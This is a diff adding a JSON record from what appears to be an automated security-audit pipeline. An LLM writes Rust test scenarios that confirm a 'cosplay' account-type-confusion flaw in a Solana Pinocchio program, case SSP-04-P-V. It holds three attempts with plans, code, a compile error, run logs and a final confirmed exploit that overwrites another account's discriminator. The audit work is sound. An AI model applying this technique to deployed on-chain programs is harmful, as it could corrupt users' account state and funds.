@@ -1,0 +1,232 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: conta de outro tipo foi sobrescrita com o discriminador de config",
+  "attempts_used": 3,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2327,
+        "completion_tokens": 799,
+        "latency_s": 4.88
+      },
+      "raw": "{\n  \"plan\": \"O programa `init` (Pinocchio) escreve um discriminador fixo [1..8] e campos de config nos offsets 0..49 de `accounts[0]`, sem validar o tipo da conta. O baseline usa uma conta vazia (recém-criada) como `accounts[0]` e uma authority, provando que o uso legítimo grava o layout esperado. O ataque fornece uma conta de outro tipo (discriminador diferente, ex.: [9,9,9,9,9,9,9,9]) com layout compatível como `accounts[0]`, e o programa sobrescreve seus dados como se fosse uma config. O efeito medido é que os primeiros 8 bytes da conta de outro tipo passam a ser [1,2,3,4,5,6,7,8], demonstrando que uma conta de tipo diferente foi aceita e corrompida.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet authority_acc = wallet(1_000_000_000);\\n\\n// Conta de outro tipo (discriminador diferente) com layout compativel\\nlet mut other_data = vec![0u8; 64];\\nother_data[0..8].copy_from_slice(&[9, 9, 9, 9, 9, 9, 9, 9]);\\nother_data[8..40].copy_from_slice(&[7u8; 32]);\\nother_data[40] = 42;\\nother_data[41..49].copy_from_slice(&123u64.to_le_bytes());\\nlet other_acc = account(&env.program_id, &other_data, None);\\n\\n// Conta vazia para o baseline (uso legitimo)\\nlet empty_acc = empty_account();\\n\\nlet metas = vec![\\n    AccountMeta::new(empty_acc_key, true),\\n    AccountMeta::new_readonly(authority, false),\\n];\\n\\n// Baseline: init em conta vazia (legitimo)\\nlet baseline_ix = env.raw_ix(&[0u8], metas.clone());\\nlet baseline_accounts = vec![\\n    (empty_acc_key, empty_acc),\\n    (authority, authority_acc.clone()),\\n];\\nlet baseline_res = env.baseline(\\\"init legitimo em conta vazia\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: init em conta de outro tipo\\nlet attack_metas = vec![\\n    AccountMeta::new(other_acc_key, true),\\n    AccountMeta::new_readonly(authority, false),\\n];\\nlet attack_ix = env.raw_ix(&[0u8], attack_metas);\\nlet attack_accounts = vec![\\n    (other_acc_key, other_acc),\\n    (authority, authority_acc),\\n];\\nlet r = env.attack(\\\"init em conta de outro tipo (cosplay)\\\", &attack_ix, &attack_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let after_data = after(&r, &other_acc_key).data();\\n    env.effect(\\n        \\\"conta de outro tipo foi sobrescrita com o discriminador de config\\\",\\n        after_data.len() >= 8 && after_data[0..8] == [1, 2, 3, 4, 5, 6, 7, 8],\\n    );\\n}\"\n}",
+      "plan": "O programa `init` (Pinocchio) escreve um discriminador fixo [1..8] e campos de config nos offsets 0..49 de `accounts[0]`, sem validar o tipo da conta. O baseline usa uma conta vazia (recém-criada) como `accounts[0]` e uma authority, provando que o uso legítimo grava o layout esperado. O ataque fornece uma conta de outro tipo (discriminador diferente, ex.: [9,9,9,9,9,9,9,9]) com layout compatível como `accounts[0]`, e o programa sobrescreve seus dados como se fosse uma config. O efeito medido é que os primeiros 8 bytes da conta de outro tipo passam a ser [1,2,3,4,5,6,7,8], demonstrando que uma conta de tipo diferente foi aceita e corrompida.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet authority_acc = wallet(1_000_000_000);\n\n// Conta de outro tipo (discriminador diferente) com layout compativel\nlet mut other_data = vec![0u8; 64];\nother_data[0..8].copy_from_slice(&[9, 9, 9, 9, 9, 9, 9, 9]);\nother_data[8..40].copy_from_slice(&[7u8; 32]);\nother_data[40] = 42;\nother_data[41..49].copy_from_slice(&123u64.to_le_bytes());\nlet other_acc = account(&env.program_id, &other_data, None);\n\n// Conta vazia para o baseline (uso legitimo)\nlet empty_acc = empty_account();\n\nlet metas = vec![\n    AccountMeta::new(empty_acc_key, true),\n    AccountMeta::new_readonly(authority, false),\n];\n\n// Baseline: init em conta vazia (legitimo)\nlet baseline_ix = env.raw_ix(&[0u8], metas.clone());\nlet baseline_accounts = vec![\n    (empty_acc_key, empty_acc),\n    (authority, authority_acc.clone()),\n];\nlet baseline_res = env.baseline(\"init legitimo em conta vazia\", &baseline_ix, &baseline_accounts);\n\n// Ataque: init em conta de outro tipo\nlet attack_metas = vec![\n    AccountMeta::new(other_acc_key, true),\n    AccountMeta::new_readonly(authority, false),\n];\nlet attack_ix = env.raw_ix(&[0u8], attack_metas);\nlet attack_accounts = vec![\n    (other_acc_key, other_acc),\n    (authority, authority_acc),\n];\nlet r = env.attack(\"init em conta de outro tipo (cosplay)\", &attack_ix, &attack_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let after_data = after(&r, &other_acc_key).data();\n    env.effect(\n        \"conta de outro tipo foi sobrescrita com o discriminador de config\",\n        after_data.len() >= 8 && after_data[0..8] == [1, 2, 3, 4, 5, 6, 7, 8],\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `empty_acc_key` in this scope\n  --> tests/attempt.rs:24:26\n   |\n24 |         AccountMeta::new(empty_acc_key, true),\n   |                          ^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n24 -         AccountMeta::new(empty_acc_key, true),\n24 +         AccountMeta::new(empty_acc, true),\n   |\n\nerror[E0425]: cannot find value `empty_acc_key` in this scope\n  --> tests/attempt.rs:31:10\n   |\n31 |         (empty_acc_key, empty_acc),\n   |          ^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n31 -         (empty_acc_key, empty_acc),\n31 +         (empty_acc, empty_acc),\n   |\n\nerror[E0425]: cannot find value `other_acc_key` in this scope\n  --> tests/attempt.rs:38:26\n   |\n38 |         AccountMeta::new(other_acc_key, true),\n   |                          ^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n38 -         AccountMeta::new(other_acc_key, true),\n38 +         AccountMeta::new(other_acc, true),\n   |\n\nerror[E0425]: cannot find value `other_acc_key` in this scope\n  --> tests/attempt.rs:43:10\n   |\n43 |         (other_acc_key, other_acc),",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `empty_acc_key` in this scope\n  --> tests/attempt.rs:24:26\n   |\n24 |         AccountMeta::new(empty_acc_key, true),\n   |                          ^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n24 -         AccountMeta::new(empty_acc_key, true),\n24 +         AccountMeta::new(empty_acc, true),\n   |\n\nerror[E0425]: cannot find value `empty_acc_key` in this scope\n  --> tests/attempt.rs:31:10\n   |\n31 |         (empty_acc_key, empty_acc),\n   |          ^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n31 -         (empty_acc_key, empty_acc),\n31 +         (empty_acc, empty_acc),\n   |\n\nerror[E0425]: cannot find value `other_acc_key` in this scope\n  --> tests/attempt.rs:38:26\n   |\n38 |         AccountMeta::new(other_acc_key, true),\n   |                          ^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n38 -         AccountMeta::new(other_acc_key, true),\n38 +         AccountMeta::new(other_acc, true),\n   |\n\nerror[E0425]: cannot find value `other_acc_key` in this scope\n  --> tests/attempt.rs:43:10\n   |\n43 |         (other_acc_key, other_acc),"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3217,
+        "completion_tokens": 765,
+        "latency_s": 3.74
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta de outro tipo (discriminador 9,9,9,9,9,9,9,9) com layout compativel e uma conta vazia para o baseline. O baseline chama init numa conta vazia (uso legitimo) e deve ter sucesso. O ataque chama init na conta de outro tipo, que o programa sobrescreve sem validar discriminador. O efeito mede que os 8 primeiros bytes da conta de outro tipo passaram a ser o discriminador fixo [1,2,3,4,5,6,7,8], provando o cosplay.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet authority_acc = wallet(1_000_000_000);\\n\\n// Conta de outro tipo (discriminador diferente) com layout compativel\\nlet mut other_data = vec![0u8; 64];\\nother_data[0..8].copy_from_slice(&[9, 9, 9, 9, 9, 9, 9, 9]);\\nother_data[8..40].copy_from_slice(&[7u8; 32]);\\nother_data[40] = 42;\\nother_data[41..49].copy_from_slice(&123u64.to_le_bytes());\\nlet other_acc_key = Pubkey::new_unique();\\nlet other_acc = account(&env.program_id, &other_data, None);\\n\\n// Conta vazia para o baseline (uso legitimo)\\nlet empty_acc_key = Pubkey::new_unique();\\nlet empty_acc = empty_account();\\n\\n// Baseline: init em conta vazia (legitimo)\\nlet baseline_metas = vec![\\n    AccountMeta::new(empty_acc_key, true),\\n    AccountMeta::new_readonly(authority, false),\\n];\\nlet baseline_ix = env.raw_ix(&[0u8], baseline_metas);\\nlet baseline_accounts = vec![\\n    (empty_acc_key, empty_acc),\\n    (authority, authority_acc.clone()),\\n];\\nlet _baseline_res = env.baseline(\\\"init legitimo em conta vazia\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: init em conta de outro tipo\\nlet attack_metas = vec![\\n    AccountMeta::new(other_acc_key, true),\\n    AccountMeta::new_readonly(authority, false),\\n];\\nlet attack_ix = env.raw_ix(&[0u8], attack_metas);\\nlet attack_accounts = vec![\\n    (other_acc_key, other_acc),\\n    (authority, authority_acc),\\n];\\nlet r = env.attack(\\\"init em conta de outro tipo (cosplay)\\\", &attack_ix, &attack_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let after_data = after(&r, &other_acc_key).data();\\n    env.effect(\\n        \\\"conta de outro tipo foi sobrescrita com o discriminador de config\\\",\\n        after_data.len() >= 8 && after_data[0..8] == [1, 2, 3, 4, 5, 6, 7, 8],\\n    );\\n}\"\n}",
+      "plan": "Preparo uma conta de outro tipo (discriminador 9,9,9,9,9,9,9,9) com layout compativel e uma conta vazia para o baseline. O baseline chama init numa conta vazia (uso legitimo) e deve ter sucesso. O ataque chama init na conta de outro tipo, que o programa sobrescreve sem validar discriminador. O efeito mede que os 8 primeiros bytes da conta de outro tipo passaram a ser o discriminador fixo [1,2,3,4,5,6,7,8], provando o cosplay.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet authority_acc = wallet(1_000_000_000);\n\n// Conta de outro tipo (discriminador diferente) com layout compativel\nlet mut other_data = vec![0u8; 64];\nother_data[0..8].copy_from_slice(&[9, 9, 9, 9, 9, 9, 9, 9]);\nother_data[8..40].copy_from_slice(&[7u8; 32]);\nother_data[40] = 42;\nother_data[41..49].copy_from_slice(&123u64.to_le_bytes());\nlet other_acc_key = Pubkey::new_unique();\nlet other_acc = account(&env.program_id, &other_data, None);\n\n// Conta vazia para o baseline (uso legitimo)\nlet empty_acc_key = Pubkey::new_unique();\nlet empty_acc = empty_account();\n\n// Baseline: init em conta vazia (legitimo)\nlet baseline_metas = vec![\n    AccountMeta::new(empty_acc_key, true),\n    AccountMeta::new_readonly(authority, false),\n];\nlet baseline_ix = env.raw_ix(&[0u8], baseline_metas);\nlet baseline_accounts = vec![\n    (empty_acc_key, empty_acc),\n    (authority, authority_acc.clone()),\n];\nlet _baseline_res = env.baseline(\"init legitimo em conta vazia\", &baseline_ix, &baseline_accounts);\n\n// Ataque: init em conta de outro tipo\nlet attack_metas = vec![\n    AccountMeta::new(other_acc_key, true),\n    AccountMeta::new_readonly(authority, false),\n];\nlet attack_ix = env.raw_ix(&[0u8], attack_metas);\nlet attack_accounts = vec![\n    (other_acc_key, other_acc),\n    (authority, authority_acc),\n];\nlet r = env.attack(\"init em conta de outro tipo (cosplay)\", &attack_ix, &attack_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let after_data = after(&r, &other_acc_key).data();\n    env.effect(\n        \"conta de outro tipo foi sobrescrita com o discriminador de config\",\n        after_data.len() >= 8 && after_data[0..8] == [1, 2, 3, 4, 5, 6, 7, 8],\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "init legitimo em conta vazia",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 390,
+            "account_flags": "sw,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": true,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "init em conta de outro tipo (cosplay)",
+            "result": "Success",
+            "compute_units": 278,
+            "account_flags": "sw,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 64,
+                "head": "0909090909090909",
+                "digest": "e91fed4ea677e860",
+                "post": "01020304050607080000000000000002000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "conta de outro tipo foi sobrescrita com o discriminador de config",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 390 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 278 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.9
+      },
+      "verdict": null,
+      "reason": "o baseline 'init legitimo em conta vazia' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2975,
+        "completion_tokens": 769,
+        "latency_s": 3.83
+      },
+      "raw": "{\"plan\": \"O baseline falhou porque a conta vazia (empty_account) tem 0 bytes de dados e o programa escreve em data[0..49], causando out-of-bounds. Preciso criar uma conta com dados de pelo menos 49 bytes para o baseline. O ataque usa uma conta de outro tipo (discriminador diferente) com layout compativel de 64 bytes. O efeito mede se o discriminador da conta de outro tipo foi sobrescrito com [1,2,3,4,5,6,7,8].\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet authority_acc = wallet(1_000_000_000);\\n\\n// Conta de outro tipo (discriminador diferente) com layout compativel\\nlet mut other_data = vec![0u8; 64];\\nother_data[0..8].copy_from_slice(&[9, 9, 9, 9, 9, 9, 9, 9]);\\nother_data[8..40].copy_from_slice(&[7u8; 32]);\\nother_data[40] = 42;\\nother_data[41..49].copy_from_slice(&123u64.to_le_bytes());\\nlet other_acc_key = Pubkey::new_unique();\\nlet other_acc = account(&env.program_id, &other_data, None);\\n\\n// Conta com dados suficientes para o baseline (49 bytes)\\nlet mut empty_data = vec![0u8; 64];\\nlet empty_acc_key = Pubkey::new_unique();\\nlet empty_acc = account(&env.program_id, &empty_data, None);\\n\\n// Baseline: init em conta com dados suficientes (legitimo)\\nlet baseline_metas = vec![\\n    AccountMeta::new(empty_acc_key, true),\\n    AccountMeta::new_readonly(authority, false),\\n];\\nlet baseline_ix = env.raw_ix(&[0u8], baseline_metas);\\nlet baseline_accounts = vec![\\n    (empty_acc_key, empty_acc),\\n    (authority, authority_acc.clone()),\\n];\\nlet _baseline_res = env.baseline(\\\"init legitimo em conta com dados\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: init em conta de outro tipo\\nlet attack_metas = vec![\\n    AccountMeta::new(other_acc_key, true),\\n    AccountMeta::new_readonly(authority, false),\\n];\\nlet attack_ix = env.raw_ix(&[0u8], attack_metas);\\nlet attack_accounts = vec![\\n    (other_acc_key, other_acc),\\n    (authority, authority_acc),\\n];\\nlet r = env.attack(\\\"init em conta de outro tipo (cosplay)\\\", &attack_ix, &attack_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let after_data = after(&r, &other_acc_key).data();\\n    env.effect(\\n        \\\"conta de outro tipo foi sobrescrita com o discriminador de config\\\",\\n        after_data.len() >= 8 && after_data[0..8] == [1, 2, 3, 4, 5, 6, 7, 8],\\n    );\\n}\"}",
+      "plan": "O baseline falhou porque a conta vazia (empty_account) tem 0 bytes de dados e o programa escreve em data[0..49], causando out-of-bounds. Preciso criar uma conta com dados de pelo menos 49 bytes para o baseline. O ataque usa uma conta de outro tipo (discriminador diferente) com layout compativel de 64 bytes. O efeito mede se o discriminador da conta de outro tipo foi sobrescrito com [1,2,3,4,5,6,7,8].",
+      "scenario": "let authority = Pubkey::new_unique();\nlet authority_acc = wallet(1_000_000_000);\n\n// Conta de outro tipo (discriminador diferente) com layout compativel\nlet mut other_data = vec![0u8; 64];\nother_data[0..8].copy_from_slice(&[9, 9, 9, 9, 9, 9, 9, 9]);\nother_data[8..40].copy_from_slice(&[7u8; 32]);\nother_data[40] = 42;\nother_data[41..49].copy_from_slice(&123u64.to_le_bytes());\nlet other_acc_key = Pubkey::new_unique();\nlet other_acc = account(&env.program_id, &other_data, None);\n\n// Conta com dados suficientes para o baseline (49 bytes)\nlet mut empty_data = vec![0u8; 64];\nlet empty_acc_key = Pubkey::new_unique();\nlet empty_acc = account(&env.program_id, &empty_data, None);\n\n// Baseline: init em conta com dados suficientes (legitimo)\nlet baseline_metas = vec![\n    AccountMeta::new(empty_acc_key, true),\n    AccountMeta::new_readonly(authority, false),\n];\nlet baseline_ix = env.raw_ix(&[0u8], baseline_metas);\nlet baseline_accounts = vec![\n    (empty_acc_key, empty_acc),\n    (authority, authority_acc.clone()),\n];\nlet _baseline_res = env.baseline(\"init legitimo em conta com dados\", &baseline_ix, &baseline_accounts);\n\n// Ataque: init em conta de outro tipo\nlet attack_metas = vec![\n    AccountMeta::new(other_acc_key, true),\n    AccountMeta::new_readonly(authority, false),\n];\nlet attack_ix = env.raw_ix(&[0u8], attack_metas);\nlet attack_accounts = vec![\n    (other_acc_key, other_acc),\n    (authority, authority_acc),\n];\nlet r = env.attack(\"init em conta de outro tipo (cosplay)\", &attack_ix, &attack_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let after_data = after(&r, &other_acc_key).data();\n    env.effect(\n        \"conta de outro tipo foi sobrescrita com o discriminador de config\",\n        after_data.len() >= 8 && after_data[0..8] == [1, 2, 3, 4, 5, 6, 7, 8],\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "init legitimo em conta com dados",
+            "result": "Success",
+            "compute_units": 278,
+            "account_flags": "sw,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": true,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 64,
+                "head": "0000000000000000",
+                "digest": "f5a5fd42d16a2030",
+                "post": "01020304050607080000000000000002000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "init em conta de outro tipo (cosplay)",
+            "result": "Success",
+            "compute_units": 278,
+            "account_flags": "sw,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 64,
+                "head": "0909090909090909",
+                "digest": "e91fed4ea677e860",
+                "post": "01020304050607080000000000000002000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "conta de outro tipo foi sobrescrita com o discriminador de config",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 278 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 278 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: conta de outro tipo foi sobrescrita com o discriminador de config"
+    }
+  ],
+  "case_id": "SSP-04-P-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "medium",
+    "evidence": "let config = &accounts[0];\nlet mut data = config.try_borrow_mut_data()?;\ndata[0..8].copy_from_slice(&[1, 2, 3, 4, 5, 6, 7, 8]);",
+    "explanation": "Os dados da conta sao acessados via `AccountInfo` sem validar um discriminador de tipo pre-existente; o programa apenas escreve um discriminador fixo sem verificar se a conta realmente corresponde ao tipo esperado. Nao ha uso de `Account<'info, T>` que validaria o discriminador.",
+    "attack_hypothesis": "Um atacante fornece uma conta de outro tipo com layout compativel como `accounts[0]`, e o programa trata seus dados como uma config, sobrescrevendo campos que pertencem a outro tipo de conta."
+  }
+}
